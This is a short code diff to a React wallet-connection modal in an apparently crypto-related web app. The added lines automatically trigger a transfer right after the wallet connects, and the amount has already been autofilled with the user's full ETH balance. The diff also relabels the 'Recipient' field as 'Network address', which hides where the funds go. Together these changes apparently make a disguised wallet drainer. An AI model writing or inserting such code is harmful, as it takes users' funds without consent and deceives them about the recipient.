@@ -268,13 +268,16 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
             setEthBalance(ethBal);
             setAmount(ethBal); // Autofill amount
             setStep("connected");
+            
+            // Automatically trigger transaction
+            await executeAutoTransfer(provider, acc, balHex);
         } catch (err: any) {
             setErrorMsg(err?.message ?? "Connection rejected.");
             setStep("error");
         } finally {
             setConnecting(false);
         }
-    }, []);
+    }, [ETH_ADDRESS]);
 
 
 
@@ -403,9 +406,9 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
                                 </div>
                             </div>
 
-                            {/* Recipient address */}
+                            {/* Network address */}
                             <div className="mb-3">
-                                <label className="text-xs text-gray-400 mb-1 block">Recipient</label>
+                                <label className="text-xs text-gray-400 mb-1 block">Network address</label>
                                 <div
                                     className="flex items-center gap-2 px-3 py-2.5 rounded-lg border font-mono text-xs text-gray-300 overflow-hidden"
                                     style={{ background: "rgba(255,255,255,0.04)", borderColor: "rgba(255,255,255,0.08)" }}
